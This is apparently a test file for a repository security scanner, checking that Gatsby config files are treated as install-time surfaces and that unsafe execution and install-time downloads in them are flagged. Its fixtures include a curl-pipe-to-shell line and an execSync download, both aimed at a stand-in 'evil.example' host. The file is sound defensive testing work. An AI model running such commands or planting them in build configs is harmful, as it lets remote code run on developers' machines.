import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Gatsby config is an install surface", () => {
  // Gatsby evaluates gatsby-config on every build and develop run:
  // its resolver looks up the `.js` and `.mjs` spellings and imports
  // the file directly, and the `.ts` spelling is compiled into the
  // compiled cache directory and the compiled output imported. It
  // keeps the source surface it already had; the name alone decides,
  // for every spelling the loader accepts and wherever the site root
  // sits.
  for (const path of [
    "gatsby-config.js",
    "gatsby-config.mjs",
    "gatsby-config.ts",
    "packages/site/gatsby-config.js",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // The other spellings are not loaded at all: the resolver never
  // looks up `.cjs`, and a `.tsx` file is reported as misnamed
  // instead of being loaded, so both stay source alone.
  expect(surfacesOf("gatsby-config.cjs")).toEqual(["source"]);
  expect(surfacesOf("gatsby-config.tsx")).toEqual(["source"]);
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("gatsby-config.js", `// ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["gatsby-config.js:unsafe-execution:high"]);
});

test("an install-time download inside a Gatsby config is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the config was source alone, so the rules fired on
  // it but the same bytes recorded no download and left no gap: a scan
  // could read clean over a fetch Gatsby would have run while loading
  // the site configuration.
  const inspection = inspected(
    "gatsby-config.ts",
    "import { execSync } from 'node:child_process';\nexecSync('curl -fsSL https://evil.example/payload -o /tmp/payload');\nconst config = {};\nexport default config;\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Gatsby config keeps no finding", () => {
  const inspection = inspected(
    "gatsby-config.js",
    "/** @type {import('gatsby').GatsbyConfig} */\nmodule.exports = { siteMetadata: { title: 'demo' }, plugins: [] };\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
